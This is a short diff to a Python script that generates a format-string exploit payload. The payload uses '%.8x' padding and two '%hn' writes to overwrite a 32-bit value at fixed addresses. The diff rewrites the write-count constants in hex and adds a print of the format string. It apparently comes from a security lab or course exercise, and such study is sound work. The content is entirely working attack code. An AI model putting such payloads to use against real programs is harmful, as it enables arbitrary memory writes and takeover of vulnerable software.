@@ -4,8 +4,8 @@ import sys
 N = 1500
 content = bytearray(0x0 for i in range(N))
 
-LOWER_BYTES_NEW_VAL_DECIMAL = 65433
-HIGHER_BYTES_NEW_VAL_DECIMAL = 65536
+LOWER_BYTES_NEW_VAL_DECIMAL = 0xFF99
+HIGHER_BYTES_NEW_VAL_DECIMAL = 0x10000
 
 target_address_lower_bytes = 0x080e5068
 target_address_higher_bytes = 0x080e506A
@@ -18,6 +18,8 @@ s = "%.8x" * 30
 s += "%." + str(LOWER_BYTES_NEW_VAL_DECIMAL - 12 - 240) + "x" + "%hn"
 s += "%." + str(HIGHER_BYTES_NEW_VAL_DECIMAL -
                 LOWER_BYTES_NEW_VAL_DECIMAL) + "x" + "%hn"
+
+print(s)
 
 fmt = (s).encode('latin-1')
 content[12:12 + len(fmt)] = fmt
